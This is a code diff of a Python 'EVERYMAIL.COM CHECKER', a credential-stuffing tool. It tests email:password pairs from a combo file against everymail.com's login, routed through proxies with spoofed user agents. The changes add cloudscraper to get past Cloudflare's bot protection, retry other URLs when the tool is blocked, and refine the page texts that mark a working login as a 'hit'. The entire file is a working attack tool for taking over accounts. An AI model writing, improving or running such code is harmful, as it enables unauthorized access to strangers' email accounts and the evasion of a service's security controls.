@@ -9,6 +9,13 @@ from queue import Queue
 from colorama import init, Fore, Style
 from user_agent import generate_user_agent
 
+# Try to import cloudscraper for Cloudflare bypass
+try:
+    import cloudscraper
+    CLOUDSCRAPER_AVAILABLE = True
+except ImportError:
+    CLOUDSCRAPER_AVAILABLE = False
+
 warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
 
@@ -39,6 +46,8 @@ os.system('cls' if os.name == 'nt' else 'clear')
 
 print(f"{Fore.CYAN}{'EVERYMAIL.COM CHECKER'.center(columns)}")
 print(f"{Fore.YELLOW}{'Code By — @LEGEND_BL'.center(columns)}")
+if CLOUDSCRAPER_AVAILABLE:
+    print(f"{Fore.GREEN}{'[CloudScraper Enabled]'.center(columns)}")
 
 combo_input = input(f"\n{Fore.CYAN}Combo file (default: combo.txt): {Style.RESET_ALL}").strip()
 combo_file = combo_input.strip('"').strip("'").strip() or "combo.txt"
@@ -147,12 +156,23 @@ print_lock = threading.Lock()
 result_counter = 0
 
 def check_account(email, pwd, proxy_dict):
-    """Check Everymail account - FIX: Better anti-bot headers and multiple endpoints"""
-    s = requests.Session()
+    """Check Everymail account - Using CloudScraper for Cloudflare bypass"""
+    
+    # Use cloudscraper if available for Cloudflare bypass
+    if CLOUDSCRAPER_AVAILABLE:
+        s = cloudscraper.create_scraper(
+            browser={
+                'browser': 'chrome',
+                'platform': 'windows',
+                'desktop': True
+            }
+        )
+    else:
+        s = requests.Session()
+    
     userA = get_random_user_agent()
     
     try:
-        # Better browser-like headers to avoid 403
         headers = {
             "User-Agent": userA,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
@@ -165,20 +185,20 @@ def check_account(email, pwd, proxy_dict):
             "Sec-Fetch-Site": "none",
             "Sec-Fetch-User": "?1",
             "Cache-Control": "max-age=0",
-            "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": '"Windows"',
         }
         
-        # First get the main page
-        r1 = s.get("https://everymail.com/", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
+        # Try main page first
+        r1 = s.get("https://everymail.com/", headers=headers, proxies=proxy_dict, timeout=30, verify=False)
         
-        # If blocked, try alternate approach
+        # If still blocked, try different approach
         if r1.status_code == 403:
-            # Try webmail direct access
-            r1 = s.get("https://webmail.everymail.com/", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
+            # Try alternate URL
+            r1 = s.get("https://www.everymail.com/", headers=headers, proxies=proxy_dict, timeout=30, verify=False)
         
-        # Update headers for login
+        if r1.status_code == 403:
+            return "fail", "Cloudflare blocked (403)"
+        
+        # Update for login
         headers.update({
             "Content-Type": "application/x-www-form-urlencoded",
             "Origin": "https://everymail.com",
@@ -186,33 +206,28 @@ def check_account(email, pwd, proxy_dict):
             "Sec-Fetch-Site": "same-origin",
         })
         
-        # Try login
         r = s.post("https://everymail.com/login",
                    data={"email": email, "password": pwd, "remember": "1"},
-                   headers=headers, proxies=proxy_dict, timeout=25, verify=False, allow_redirects=True)
+                   headers=headers, proxies=proxy_dict, timeout=30, verify=False, allow_redirects=True)
         
         txt = r.text.lower()
         url = r.url.lower()
         
-        # Check for successful login indicators
+        # Success indicators
         if any(x in url for x in ["inbox", "dashboard", "mail", "webmail", "messages"]):
             return "hit", "Valid"
-        if any(x in txt for x in ["inbox", "compose", "sent", "logout", "new message"]):
+        if any(x in txt for x in ["inbox", "compose", "sent", "logout", "new message", "mailbox"]):
             return "hit", "Valid"
         
-        # Check for failure indicators  
-        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "forbidden", "failed"]):
+        # Failure indicators
+        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "failed", "denied"]):
             return "fail", "Invalid credentials"
         
-        # Check if still on login page (failed)
         if "login" in url and ("email" in txt or "password" in txt):
             return "fail", "Login failed"
-            
-        # Status code checks
+        
         if r.status_code == 403:
-            return "fail", "Site blocked (403)"
-        if r.status_code == 401:
-            return "fail", "Unauthorized"
+            return "fail", "Blocked (403)"
             
         return "fail", f"Status {r.status_code}"
         
